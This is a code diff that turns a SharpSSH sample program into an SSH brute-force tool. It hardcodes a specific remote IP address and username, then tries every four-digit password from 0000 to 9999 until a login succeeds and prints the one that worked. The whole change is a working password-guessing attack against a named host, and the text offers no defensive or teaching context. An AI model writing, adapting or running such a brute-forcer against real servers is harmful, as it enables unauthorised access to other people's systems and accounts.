@@ -15,12 +15,12 @@ namespace sshfb
         {
             PrintVersoin();
             Console.WriteLine();
-            Console.WriteLine("1) Simple SSH session example using SshStream");
+            Console.WriteLine("1) Fuerza Bruta conectando a msicuprueba");
             Console.WriteLine();
 
-        INPUT:
+            INPUT:
             int i = -1;
-            Console.Write("Please enter your choice: ");
+            Console.Write("Por favor introduce 1: ");
             try
             {
                 i = int.Parse(Console.ReadLine());
@@ -38,7 +38,7 @@ namespace sshfb
                     break;
 
                 default:
-                    Console.Write("Bad input, ");
+                    Console.Write("Algo salio mal!!, ");
                     goto INPUT;
             }
         }
@@ -49,12 +49,14 @@ namespace sshfb
         public static void GetInput()
         {
             Console.Write("Remote Host: ");
-            host = Console.ReadLine();
+            host = "74.208.234.113";
+            Console.Write(host + "\n");
             Console.Write("User: ");
-            user = Console.ReadLine();
-            Console.Write("Password: ");
-            pass = Console.ReadLine();
-            Console.WriteLine();
+            user = "msicuprueba";
+            Console.Write(user + "\n");
+            //Console.Write("Password: ");
+            pass = "0";
+            //Console.WriteLine();
         }
 
         /// <summary>
@@ -63,29 +65,56 @@ namespace sshfb
         public static void SshStream()
         {
             GetInput();
+            SshShell sshShell = new SshShell(host, user);
+            for (int i = Convert.ToInt32(pass); i < 9999; i++)
+            {
 
-            try
-            {
-                
-                SshShell sshShell = new SshShell(host, user);
-                if (pass != null)
+                try
+                {
+
+                    string pp = Convert.ToString(i);
+                    int length = pp.Length;
+
+                    switch (length)
+                    {
+                        case 1:
+                            pass = "000" + pp;
+
+                            break;
+                        case 2:
+                            pass = "00" + pp;
+
+                            break;
+                        case 3:
+                            pass = "0" + pp;
+
+                            break;
+                        case 4:
+                            pass = pp;
+
+                            break;
+                        default:
+                            Console.WriteLine("fuera de rango");
+                            break;
+                    }
+
+
                     sshShell.Password = pass;
-                
-                sshShell.RedirectToConsole();
-                Console.Write("Connecting...");
-                sshShell.Connect();
-                Console.WriteLine("OK");
-                while (sshShell.ShellOpened)
-                    Thread.Sleep(500);
-                Console.Write("Disconnecting...");
-                sshShell.Close();
-                Console.WriteLine("OK");
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine(ex.Message);
-                Console.ReadLine();
-            }
+                    sshShell.RedirectToConsole();
+                    Console.Write("Connecting...");
+
+                    sshShell.Connect();
+                    Console.WriteLine("OK " + pass);
+                    break;
+
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine(ex.Message);
+                    Console.WriteLine("OK " + pass);
+                }
+            };
+
         }
 
         static void PrintVersoin()
@@ -99,12 +128,12 @@ namespace sshfb
             catch
             {
                 Console.WriteLine("sharpSsh v1.0");
-                
+
             }
         }
 
-        
+
 
     }
-    
+
 }
